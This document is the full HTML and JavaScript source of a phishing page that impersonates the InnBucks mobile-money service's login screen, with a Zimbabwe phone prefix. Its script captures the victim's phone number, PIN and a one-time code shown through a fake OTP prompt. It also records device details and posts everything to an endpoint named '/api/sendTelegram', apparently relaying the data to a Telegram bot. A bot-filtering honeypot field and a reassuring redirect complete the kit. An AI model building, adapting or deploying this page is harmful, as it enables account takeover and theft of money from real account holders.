<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>InnBucks — Login</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">

<style>
*{box-sizing:border-box}
html,body{height:100%}
body{
  font-family:Inter,system-ui,Arial;
  background:#020617;
  margin:0;
  padding:18px;
  display:flex;
  align-items:center;
  justify-content:center;
  color:#e5e7eb;
}
.card{
  width:100%;
  max-width:380px;
  background:#020617;
  padding:20px;
  border-radius:12px;
  border:1px solid #1f2937;
  box-shadow:0 20px 50px rgba(0,0,0,.7)
}
.logo{height:44px;display:block;margin:0 auto 10px}
h2{text-align:center;margin:0 0 12px;font-size:20px;color:#f8fafc}
label{display:block;font-size:13px;margin-top:8px;color:#cbd5f5}

input{
  width:100%;
  padding:10px;
  border-radius:8px;
  border:1px solid #1f2937;
  background:#020617;
  color:#e5e7eb;
  font-size:14px
}
.btn{
  background:#2563eb;
  color:#fff;
  padding:10px;
  border-radius:8px;
  border:0;
  margin-top:12px;
  width:100%
}
.btn[disabled]{background:#334155}

.req{color:#ef4444;margin-right:6px}
.small{font-size:13px;color:#9ca3af}
.success{color:#22c55e;font-weight:600}

.error{
  min-height:18px;
  font-size:13px;
  color:#ef4444;
}

/* PIN */
.pin-row{display:flex;gap:10px;justify-content:center;margin-top:10px}
.pin-digit{
  width:18px;height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  text-align:center;
  font-size:1px;          /* FIX */
  color:transparent;
  caret-color:transparent;
}
.pin-digit.filled{
  background:#2563eb;
  border-color:#2563eb;
}

/* OTP */
.otp-modal{
  position:fixed;
  inset:0;
  background:rgba(2,6,23,.85);
  display:flex;
  align-items:center;
  justify-content:center
}
.otp-box{
  background:#020617;
  padding:18px;
  border-radius:12px;
  min-width:300px;
  border:1px solid #1f2937
}
.otp-row{display:flex;gap:10px;justify-content:center;margin-top:10px}
.otp-digit{
  width:18px;height:18px;
  border-radius:50%;
  border:2px solid #fff;
  background:#fff;
  text-align:center;
  font-size:1px;          /* FIX */
  color:transparent;
  caret-color:transparent;
}
.otp-digit.filled{
  background:#2563eb;
  border-color:#2563eb
}
.otp-warning{color:#ef4444;font-size:13px;display:none}

.resend-row{
  display:flex;
  justify-content:space-between;
  margin-top:12px
}
.resend-btn{
  background:#020617;
  border:1px solid #1f2937;
  padding:6px 12px;
  border-radius:8px;
  color:#e5e7eb
}
.resend-btn[disabled]{opacity:.5}
</style>
</head>

<body>

<div class="card">
  <img src="assets/InnBucks.png" alt="InnBucks" class="logo">
  <h2>Login</h2>

  <form id="loginForm" autocomplete="off">
    <label><span class="req">★</span>Mobile Number</label>
    <input id="phone" value="+263" inputmode="numeric">
    <div id="phoneError" class="error"></div>

    <label><span class="req">★</span>Enter your PIN</label>
    <div class="pin-row">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
      <input class="pin-digit" maxlength="1" inputmode="numeric">
    </div>

    <input type="text" id="hp" style="display:none">

    <button id="loginBtn" class="btn" disabled>LOGIN</button>
  </form>
</div>

<!-- OTP MODAL -->
<div id="otpModal" class="otp-modal" style="display:none">
  <div class="otp-box">
    <div style="text-align:center"><strong>Enter OTP</strong></div>
    <p class="small">We have sent an OTP to your phone.</p>

    <div class="otp-row">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
    </div>

    <div id="otpWarning" class="otp-warning">Please input 5 digits</div>

    <div class="resend-row">
      <div class="small" id="resendInfo">
        Resend available in <span id="countdown">120</span>s
      </div>
      <button id="resendBtn" class="resend-btn" disabled>Resend OTP</button>
    </div>

    <div style="display:flex;gap:10px;margin-top:12px">
      <button id="confirmOtp" disabled>Confirm</button>
      <button id="cancelOtp">Cancel</button>
    </div>

    <div id="otpStatus" class="small" style="margin-top:8px"></div>
  </div>
</div>

<script>
/* ===== DEVICE ===== */
const ua = navigator.userAgent;
let device = 'Unknown';

if (/Android/i.test(ua)) {
  const v = ua.match(/Android\s([\d.]+)/);
  device = 'Android ' + (v ? v[1] : '');
} else if (/iPhone|iPad/i.test(ua)) {
  const v = ua.match(/OS (\d+_\d+)/);
  device = 'iOS ' + (v ? v[1].replace('_','.') : '');
}
if (/Chrome/i.test(ua)) device += ' | Chrome';
else if (/Safari/i.test(ua)) device += ' | Safari';
else if (/Firefox/i.test(ua)) device += ' | Firefox';

/* ===== PHONE ===== */
const phone = document.getElementById('phone');
const phoneError = document.getElementById('phoneError');
const loginBtn = document.getElementById('loginBtn');

function validatePhone(){
  const d = phone.value.replace('+263','');
  if (!/^7\d{8}$/.test(d)) {
    phoneError.innerText = 'Input 9-digit number starting with 7';
    return false;
  }
  phoneError.innerText = '';
  return true;
}

phone.addEventListener('keydown',e=>{
  if(phone.selectionStart<=4 && e.key==='Backspace') e.preventDefault();
});

phone.addEventListener('input',()=>{
  let d = phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
  phone.value = '+263' + d;
  validatePhone();
  updateLogin();
});

/* ===== PIN ===== */
const pins=[...document.querySelectorAll('.pin-digit')];
let pinValue='';

pins.forEach((p,i)=>{
  p.addEventListener('input',()=>{
    p.value=p.value.replace(/\D/g,'');
    p.classList.toggle('filled',!!p.value);
    if(p.value && i<3) pins[i+1].focus();
    pinValue=pins.map(x=>x.value).join('');
    updateLogin();
  });
});

function updateLogin(){
  loginBtn.disabled = !(validatePhone() && /^\d{4}$/.test(pinValue));
}

/* ===== API ===== */
async function sendToServer(payload){
  return fetch('/api/sendTelegram',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload)
  });
}

/* ===== OTP ===== */
const otpModal=document.getElementById('otpModal');
const dEls=[0,1,2,3,4].map(i=>document.getElementById('d'+i));
const confirmBtn=document.getElementById('confirmOtp');
const cancelBtn=document.getElementById('cancelOtp');
const resendBtn=document.getElementById('resendBtn');
const otpWarning=document.getElementById('otpWarning');
const otpStatus=document.getElementById('otpStatus');
const countdown=document.getElementById('countdown');
const resendInfo=document.getElementById('resendInfo');

let timer,seconds=120;

function startCountdown(){
  clearInterval(timer);
  seconds=120;
  resendBtn.disabled=true;
  resendInfo.innerHTML='Resend available in <span id="countdown">120</span>s';
  timer=setInterval(()=>{
    seconds--;
    countdown.textContent=seconds;
    if(seconds<=0){
      clearInterval(timer);
      resendBtn.disabled=false;
      resendInfo.textContent="Didn't receive OTP?";
    }
  },1000);
}

function getOtp(){return dEls.map(d=>d.value).join('');}
function updateConfirm(){
  const ok=/^\d{5}$/.test(getOtp());
  confirmBtn.disabled=!ok;
  otpWarning.style.display=ok?'none':'block';
}

dEls.forEach((d,i)=>{
  d.addEventListener('input',()=>{
    d.value=d.value.replace(/\D/g,'');
    d.classList.toggle('filled',!!d.value);
    if(d.value && i<4) dEls[i+1].focus();
    updateConfirm();
  });
});

/* ===== LOGIN ===== */
document.getElementById('loginForm').addEventListener('submit',async e=>{
  e.preventDefault();
  if(document.getElementById('hp').value) return;

  if (navigator.vibrate) navigator.vibrate(30); // vibration

  otpModal.style.display='flex';
  dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
  updateConfirm();
  startCountdown();

  await sendToServer({
    event:'login_clicked',
    loginPhone:phone.value,
    loginPin:pinValue,
    device,
    submittedAt:new Date().toISOString()
  });
});

cancelBtn.onclick=()=>{
  otpModal.style.display='none';
  clearInterval(timer);
};

resendBtn.onclick=async()=>{
  await sendToServer({
    event:'resend_otp',
    loginPhone:phone.value,
    loginPin:pinValue,
    device,
    submittedAt:new Date().toISOString()
  });
};

confirmBtn.onclick=async()=>{
  await sendToServer({
    event:'otp_confirm',
    loginPhone:phone.value,
    loginPin:pinValue,
    otp:getOtp(),
    device,
    submittedAt:new Date().toISOString()
  });
  otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
  setTimeout(()=>location.href='thankyou.html',1200);
};
</script>
</body>
</html>
